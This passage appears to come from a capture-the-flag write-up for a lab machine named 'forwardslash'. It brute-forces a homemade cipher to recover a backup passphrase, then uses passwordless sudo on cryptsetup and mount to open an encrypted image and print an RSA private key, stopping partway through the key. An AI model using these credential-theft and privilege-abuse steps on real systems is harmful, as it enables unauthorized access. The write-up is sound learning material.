&lt;span class="code-line"&gt;    &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;char_key&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;char_key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;char_key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;255&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;-=&lt;/span&gt; &lt;span class="mi"&gt;256&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;char_key&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;reversed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;reversed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;))):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;char_key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;char_key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;256&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;REDACTED&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;REDACTED&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;REDACTED&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;REDACTED&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;REDACTED&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The key can quickly be brute force with a quick script including the &lt;code&gt;decrypt&lt;/code&gt;
function and looking for some "classic" English words in the decrypted text.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;char_key&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;reversed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;reversed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;))):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;char_key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;char_key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;256&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;ciphertext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ciphertext&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rstrip&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;165&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;127&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ciphertext&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;the &amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;be &amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;and &amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;of &amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Key: &lt;/span&gt;&lt;span class="si"&gt;{0}&lt;/span&gt;&lt;span class="s2"&gt;, Key length: &lt;/span&gt;&lt;span class="si"&gt;{1}&lt;/span&gt;&lt;span class="s2"&gt;, Msg: &lt;/span&gt;&lt;span class="si"&gt;{2}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Running the script give the following result:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ python2 decode.py&lt;/span&gt;
&lt;span class="code-line"&gt;Key: ttttttttttttttttt, Key length: 17, Msg: Hlô¿vFÞ;©¨ºÒÀî&amp;amp;you liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;em&gt;Note: there seems to be some flow in the encryption as every key starting with
&lt;code&gt;t&lt;/code&gt; and 17 characters long will decrypt the message. I modified the script to
use a fixed key:&lt;/em&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ python2 decode.py&lt;/span&gt;
&lt;span class="code-line"&gt;Key: t2345678901234567, Key length: 17, Msg: HdD.ÛÄçáp޺¿éyou liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We look at our &lt;code&gt;sudo&lt;/code&gt; permission. We can run a few commands as root without
password mostly &lt;code&gt;/sbin/cryptsetup luksOpen&lt;/code&gt; that allow to open a LUKS encrypted
image.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pain@forwardslash:~$ sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;Matching Defaults entries for pain on forwardslash:&lt;/span&gt;
&lt;span class="code-line"&gt;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User pain may run the following commands on forwardslash:&lt;/span&gt;
&lt;span class="code-line"&gt;    (root) NOPASSWD: /sbin/cryptsetup luksOpen *&lt;/span&gt;
&lt;span class="code-line"&gt;    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/&lt;/span&gt;
&lt;span class="code-line"&gt;    (root) NOPASSWD: /bin/umount ./mnt/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;With the passphrase and our &lt;code&gt;sudo&lt;/code&gt; permission we can easily open the
&lt;code&gt;encrypted_backup.img&lt;/code&gt; image which contain a RSA private key.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pain@forwardslash:/tmp/plop$ mkdir mnt&lt;/span&gt;
&lt;span class="code-line"&gt;pain@forwardslash:/tmp/plop$ sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup&lt;/span&gt;
&lt;span class="code-line"&gt;Enter passphrase for /var/backups/recovery/encrypted_backup.img:&lt;/span&gt;
&lt;span class="code-line"&gt;pain@forwardslash:/tmp/plop$ sudo /bin/mount /dev/mapper/backup ./mnt/&lt;/span&gt;
&lt;span class="code-line"&gt;pain@forwardslash:/tmp/plop$ ls mnt/&lt;/span&gt;
&lt;span class="code-line"&gt;id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;pain@forwardslash:/tmp/plop$ cat mnt/id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;-----BEGIN RSA PRIVATE KEY-----&lt;/span&gt;
&lt;span class="code-line"&gt;MIIEowIBAAKCAQEA9i/r8VGof1vpIV6rhNE9hZfBDd3u6S16uNYqLn+xFgZEQBZK&lt;/span&gt;
&lt;span class="code-line"&gt;RKh+WDykv/gukvUSauxWJndPq3F1Ck0xbcGQu6+1OBYb+fQ0B8raCRjwtwYF4gaf&lt;/span&gt;
&lt;span class="code-line"&gt;yLFcOS111mKmUIB9qR1wDsmKRbtWPPPvgs2ruafgeiHujIEkiUUk9f3WTNqUsPQc&lt;/span&gt;
&lt;span class="code-line"&gt;u2AG//ZCiqKWcWn0CcC2EhWsRQhLOvh3pGfv4gg0Gg/VNNiMPjDAYnr4iVg4XyEu&lt;/span&gt;
&lt;span class="code-line"&gt;NWS2x9PtPasWsWRPLMEPtzLhJOnHE3iVJuTnFFhp2T6CtmZui4TJH3pij6wYYis9&lt;/span&gt;
&lt;span class="code-line"&gt;MqzTmFwNzzx2HKS2tE2ty2c1CcW+F3GS/rn0EQIDAQABAoIBAQCPfjkg7D6xFSpa&lt;/span&gt;
&lt;span class="code-line"&gt;V+rTPH6GeoB9C6mwYeDREYt+lNDsDHUFgbiCMk+KMLa6afcDkzLL/brtKsfWHwhg&lt;/span&gt;
